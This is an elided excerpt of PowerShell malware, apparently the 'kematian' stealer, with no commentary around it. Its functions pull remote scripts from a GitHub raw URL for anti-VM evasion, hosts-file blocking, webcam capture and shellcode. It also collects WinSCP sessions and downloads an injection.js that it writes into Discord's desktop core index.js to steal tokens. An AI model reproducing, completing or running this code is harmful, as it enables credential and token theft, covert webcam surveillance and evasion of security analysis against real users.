...
function Invoke-TASKS {
    ...
    if ($blockhostsfile) {
        $link = "https://raw.githubusercontent.com/sdfsdsdsdfsfdffs/testtt/refs/heads/main/blockhosts.ps1"
...
function VMPROTECT {
    $link = ("https://raw.githubusercontent.com/sdfsdsdsdfsfdffs/testtt/refs/heads/main/antivm.ps1")
...
function Backup-Data {
   ...
   Get-WinSCPSessions
    ...
    $webcam = ("https://raw.githubusercontent.com/sdfsdsdsdfsfdffs/testtt/refs/heads/main/webcam.ps1")
            ...
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                ...
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        ...
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/sdfsdsdsdfsfdffs/testtt/refs/heads/main/injection.js")
                        if ($content -ne "") {
    ...
    $kematian_shellcode = ("https://raw.githubusercontent.com/sdfsdsdsdfsfdffs/testtt/refs/heads/main/kematian_shellcode.ps1")
